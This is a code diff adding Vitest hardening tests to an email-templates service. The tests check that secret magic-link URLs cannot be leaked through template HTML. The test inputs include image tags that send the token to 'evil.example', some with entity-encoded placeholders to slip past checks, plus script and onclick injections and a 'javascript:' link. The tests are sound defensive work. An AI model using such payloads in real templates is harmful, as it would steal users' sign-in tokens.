@@ -1,6 +1,10 @@
+/* eslint-disable no-script-url */
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 import type { Core } from '@strapi/types';
 
+import { errors } from '@strapi/utils';
+
+import * as sanitize from '../sanitize';
 import createTemplatesService from '../templates';
 
 type Row = { id: number; key: string; locale: string; subject: string; html: string; text: string };
@@ -12,6 +16,7 @@ const defaultsDef = {
 };
 
 const createStrapi = (isLoaded = false) => {
+  const warn = vi.fn();
   let rows: Row[] = [];
 
   const matches = (row: Row, where: Record<string, any>) =>
@@ -42,11 +47,12 @@ const createStrapi = (isLoaded = false) => {
 
   const strapi = {
     isLoaded,
+    log: { warn },
     db: { query: vi.fn(() => db) },
     plugin: vi.fn(() => ({ service: vi.fn(() => ({ send })) })),
   } as unknown as Core.Strapi;
 
-  return { strapi, db, send, getRows: () => rows };
+  return { strapi, db, send, warn, getRows: () => rows };
 };
 
 describe('Templates service', () => {
@@ -275,6 +281,126 @@ describe('Templates service', () => {
           text: 'x',
         })
       ).resolves.toBeDefined();
+    });
+  });
+  describe('hardening: what is checked is what is stored', () => {
+    const key = 'end-users.magic-link';
+    const save = (html: string) =>
+      service.update(key, 'en', { subject: 'S', html, text: '{{ url }}' });
+
+    beforeEach(() => {
+      service.register(key, {
+        defaults: { subject: 'S', html: '<p>{{ url }}</p>', text: '{{ url }}' },
+        variables: ['email', { name: 'url', secret: true, url: true }],
+      });
+    });
+
+    it.each([
+      '<img src="https://evil.example/?t=&#123;&#123; url &#125;&#125;">',
+      '<img src="https://evil.example/?t=&#x7B;&#x7B; url &#x7D;&#x7D;">',
+      '<img src="https://evil.example/?t=&#123&#123 url &#125&#125">',
+      '<a href="https://x.test" title="&#123;&#123; url &#125;&#125;">x</a>',
+    ])('refuses an entity-encoded placeholder: %s', async (html) => {
+      await expect(save(html)).rejects.toThrow(/\{\{ url \}\}/);
+      await expect(save(html)).rejects.toBeInstanceOf(errors.ValidationError);
+      expect(ctx.getRows()).toEqual([]);
+    });
+
+    it('stores exactly the HTML it checked', async () => {
+      const html = '<script>x()</script><p onclick="x()">Hi</p><a href="{{ url }}">Go</a>';
+      const check = vi.spyOn(sanitize, 'findMisplacedSecrets');
+
+      const saved = await save(html);
+
+      expect(check).toHaveBeenCalledTimes(1);
+      expect(check.mock.calls[0][0]).toBe(saved.html);
+      expect(ctx.getRows()[0].html).toBe(saved.html);
+      expect(saved.html).toBe('<p>Hi</p><a href="{{ url }}">Go</a>');
+      check.mockRestore();
+    });
+
+    it('accepts a leading placeholder in href only for a secret or url variable', async () => {
+      service.register('other.promo', {
+        defaults: { subject: 'S', html: '', text: '' },
+        variables: ['name', { name: 'link', url: true }, { name: 'code', secret: true }],
+      });
+      const body = (html: string) => ({ subject: 'S', html, text: '' });
+
+      expect(
+        (await service.update('other.promo', 'en', body('<a href="{{ link }}">a</a>'))).html
+      ).toBe('<a href="{{ link }}">a</a>');
+      expect(
+        (await service.update('other.promo', 'en', body('<a href="{{ code }}">a</a>'))).html
+      ).toBe('<a href="{{ code }}">a</a>');
+      expect(
+        (await service.update('other.promo', 'en', body('<a href="{{ name }}">a</a>'))).html
+      ).toBe('<a href>a</a>');
+    });
+  });
+
+  describe('hardening at send time', () => {
+    const key = 'end-users.magic-link';
+    const defaults = {
+      subject: 'Default',
+      html: '<p><a href="{{ url }}">Go</a></p>',
+      text: 'Default {{ url }}',
+    };
+
+    beforeEach(() => {
+      service.register(key, {
+        defaults,
+        variables: ['email', { name: 'url', secret: true, url: true }],
+      });
+    });
+
+    it('sends the registered default, and warns with the key, for a stored row that leaks a secret', async () => {
+      // A row written without the save-time check, such as one saved before it existed.
+      ctx.getRows().push({
+        id: 1,
+        key,
+        locale: 'en',
+        subject: 'Stored',
+        html: '<img src="https://evil.example/?t={{ url }}">',
+        text: 'Stored {{ url }}',
+      });
+
+      await service.sendTemplate(key, 'a@b.c', { url: 'https://app.test/magic?t=1' });
+
+      expect(ctx.send).toHaveBeenCalledWith({
+        to: 'a@b.c',
+        subject: 'Default',
+        html: '<p><a href="https://app.test/magic?t=1">Go</a></p>',
+        text: 'Default https://app.test/magic?t=1',
+      });
+      expect(ctx.warn).toHaveBeenCalledTimes(1);
+      expect(ctx.warn.mock.calls[0][0]).toContain(`"${key}"`);
+      expect(ctx.warn.mock.calls[0][0]).toContain('{{ url }}');
+    });
+
+    it('uses a stored row that keeps its secrets in text and links, without a warning', async () => {
+      await service.update(key, 'en', {
+        subject: 'Stored',
+        html: '<a href="{{ url }}">Sign in</a>',
+        text: '{{ url }}',
+      });
+
+      await service.sendTemplate(key, 'a@b.c', { url: 'https://app.test/magic' });
+
+      expect(ctx.send).toHaveBeenCalledWith(
+        expect.objectContaining({
+          subject: 'Stored',
+          html: '<a href="https://app.test/magic">Sign in</a>',
+        })
+      );
+      expect(ctx.warn).not.toHaveBeenCalled();
+    });
+
+    it('empties a link value that is not http, https or mailto', async () => {
+      await service.sendTemplate(key, 'a@b.c', { url: 'javascript:alert(1)' });
+
+      expect(ctx.send).toHaveBeenCalledWith(
+        expect.objectContaining({ html: '<p><a href="">Go</a></p>' })
+      );
     });
   });
 });
